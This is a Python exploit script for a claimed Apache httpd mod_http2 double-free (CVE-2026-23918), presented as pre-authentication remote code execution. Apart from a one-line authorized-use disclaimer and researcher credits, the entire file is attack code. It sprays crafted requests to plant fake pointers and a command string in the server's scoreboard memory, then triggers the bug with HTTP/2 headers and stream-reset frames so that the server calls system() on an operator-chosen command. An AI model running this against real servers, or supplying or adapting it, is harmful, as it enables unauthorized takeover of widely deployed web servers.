#!/usr/bin/env python3
# For authorized security research and educational use only. Use only on systems you own or are explicitly authorized to test.
"""
CVE-2026-23918 - Apache httpd mod_http2 double-free, pre-auth RCE

Found and reported by:
  Bartlomiej Dmitruk (striga.ai)
  Stanislaw Strzalkowski (isec.pl)
"""
import argparse
import itertools
import random
import socket
import ssl
import struct
import threading
import time
import sys
import os
from concurrent.futures import ThreadPoolExecutor


NULLPTR = struct.pack("<Q", 0)

class Spray:

    def __init__(self, host, port, workers, cmd, scoreboard, system):
        self.host = host
        self.port = port
        self.workers = workers
        self.cmd = cmd.encode() if isinstance(cmd, str) else cmd
        self.cmd += b";" # terminate, to ignore following characters
        self.scoreboard = int(scoreboard, 16)
        self.system = int(system, 16)

        self.active = False
        self.count = 0
        self.lock = threading.Lock()

    

    def build_scoreboard_payload(self):
        payload = b"GET /"
        cmd_ptr = self.scoreboard + len(payload)

        payload += self.cmd

        req_offset = 24
        if len(payload) > req_offset:
            print("Cannot build payload. Is the command too long?")
            exit(-1)

        log_ptr = self.scoreboard + 0xa8 # use last bytes of client64 field - likely to be null

        payload += b"A" * (req_offset - len(payload))
        session_ptr = self.scoreboard + len(payload) - 0x8
        c1_ptr = self.scoreboard + len(payload) - 0xa0
        payload += struct.pack("<Q", c1_ptr)
        payload += struct.pack("<Q", log_ptr)
        callback_ptr = self.scoreboard + len(payload) - 0x8
        payload += struct.pack("<Q", cmd_ptr)
        payload += struct.pack("<Q", self.system)
        pool_ptr = self.scoreboard + len(payload) - 0x70
        payload += struct.pack("<Q", callback_ptr)
        return payload, session_ptr, pool_ptr

    def build_request(self):
        payload, session_ptr, pool_ptr = self.build_scoreboard_payload()
        
        payload += b"\x00" * (64 - len(payload))

        assert(len(payload) <= 64) # only first 64 bit will be copied to ap_scoreboard_image->servers[0][0].request
        payload += b"A" * (128 - len(payload)) # pad

        # fake stream object
        payload += struct.pack("<Q", pool_ptr)
        payload += struct.pack("<Q", session_ptr)
        payload += struct.pack("<I", 7)  #  H2_SS_CLEANUP
        payload += b"B" * 52
        payload += NULLPTR
        payload += b"C" * 56
        payload += NULLPTR
    
        payload += b"D" * (3000 - len(payload))
        payload += b" HTTP/1.1\r\nHost: " + self.host.encode() + b"\r\n\r\n"

        return payload


    def create_connection(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((self.host, self.port))
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=self.host)
        return s

    def spray_worker(self):
        spray_line = self.build_request()

        while self.active:
            try:
                s = self.create_connection()
                s.sendall(spray_line)

                # Read just enough to let the server process it
                try:
                    s.recv(1)
                except Exception:
                    pass
                s.close()

                with self.lock:
                    self.count += 1
            except Exception:
                time.sleep(0.001)

    def init_worker(self, path, num_requests):
        req = path
        req += b" HTTP/1.1\r\nHost: " + self.host.encode() + b"\r\n\r\n"

        for _ in range(num_requests):
            try:
                s = self.create_connection()
                s.sendall(req)
                try:
                    s.recv(1)
                except Exception:
                    pass
                s.close()
            except Exception:
                time.sleep(0.001)

    def run_init(self):
        print("Making initialization requests to properly set the scoreboard memory")
    
        to_write, _, _ = self.build_scoreboard_payload()
        to_write = to_write.split(b"\x00")
        writes = [b"X".join(to_write[:x]) for x in range(1,len(to_write))]

        for w in reversed(writes):
            w += b"\x00"
            print(f"Writing: {w}")
            init_threads = []
            for i in range(self.workers):
                t = threading.Thread(target=self.init_worker, args=(w, 25), daemon=True)
                t.start()
                init_threads.append(t)
            for t in init_threads:
                t.join()
  
        print("Done")
        
    def start(self):
        print(f"[*] Starting {self.workers} spray threads")
        self.active = True
        self.threads = []
        for i in range(self.workers):
            t = threading.Thread(target=self.spray_worker, daemon=True)
            t.start()
            self.threads.append(t)

        time.sleep(0.5)  # let spray threads warm up


    
H2_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'

def build_frame(frame_type, flags, stream_id, payload):
    length = len(payload)
    header = struct.pack('>I', length)[1:]
    header += struct.pack('B', frame_type)
    header += struct.pack('B', flags)
    header += struct.pack('>I', stream_id)
    return header + payload


def build_settings_frame(settings=None, ack=False):
    if ack:
        return build_frame(0x4, 0x1, 0, b'')
    payload = b''
    if settings:
        for sid, val in settings.items():
            payload += struct.pack('>HI', sid, val)
    return build_frame(0x4, 0, 0, payload)


def hpack_encode_simple(headers):
    encoded = b''
    for name, value in headers:
        name_bytes = name.encode() if isinstance(name, str) else name
        value_bytes = value.encode() if isinstance(value, str) else value
        encoded += b'\x00'
        if len(name_bytes) < 127:
            encoded += bytes([len(name_bytes)])
        else:
            encoded += b'\x7f' + bytes([len(name_bytes) - 127])
        encoded += name_bytes
        if len(value_bytes) < 127:
            encoded += bytes([len(value_bytes)])
        else:
            encoded += b'\x7f' + bytes([len(value_bytes) - 127])
        encoded += value_bytes
    return encoded


def build_headers_frame(stream_id, path, host):
    headers = [
        (':method', 'GET'),
        (':path', path),
        (':scheme', 'https'),
        (':authority', host),
    ]
    payload = hpack_encode_simple(headers)
    flags = 0x4
    flags |= 0x1 # end stream
    return build_frame(0x1, flags, stream_id, payload)


def build_rst_stream(stream_id, error_code=0):
    payload = struct.pack('>I', error_code)
    return build_frame(0x3, 0, stream_id, payload)


class Trigger:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def create_connection(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((self.host, self.port))
        context = ssl.create_default_context()
        context.minimum_version = ssl.TLSVersion.TLSv1_2
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        context.set_alpn_protocols(['h2'])
        sock = context.wrap_socket(sock, server_hostname=self.host)
        return sock

    def trigger(self):
        try:
            sock = self.create_connection()
            sock.sendall(H2_PREFACE)
            sock.sendall(build_settings_frame({0x3: 1000, 0x4: 65535}))
            host = f"{self.host}:{self.port}"
            stream_id = 1
            sock.sendall(build_headers_frame(stream_id, b"/", host))
            sock.sendall(build_rst_stream(stream_id, 8))
            sock.close()
        except Exception as e:
            pass


    def run(self, duration_sec):
        start_time = time.time()
        round_num = 0
        while time.time() - start_time < duration_sec:
            round_num += 1
            print(f"\r[*] Trigger round {round_num}...", end='', flush=True)
            self.trigger()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', default='localhost')
    parser.add_argument('--port', type=int, default=443)
    parser.add_argument('--workers', type=int, default=32)
    parser.add_argument('--system', type=str, help="address of the system function")
    parser.add_argument('--cmd', type=str, help="command")
    parser.add_argument('--scoreboard', type=str, help="address of the request in scoreboard (scoreboard->servers[0][0].request)")
    args = parser.parse_args()

    print(f"[*] Target: {args.host}:{args.port}")

    spray = Spray(args.host,
                  args.port,
                  args.workers,
                  args.cmd,
                  args.scoreboard,
                  args.system)

    for i in itertools.cycle(range(4)):
        if i == 0:
            spray.run_init()

        if not spray.active:
            spray.start()

        trigger = Trigger(args.host, args.port)
        trigger.run(20)
       
        with spray.lock:
            print(f"[status] spray connections: {spray.count}")
        time.sleep(3) # This is mostly to avoid SIGSTOP


if __name__ == "__main__":
    main()
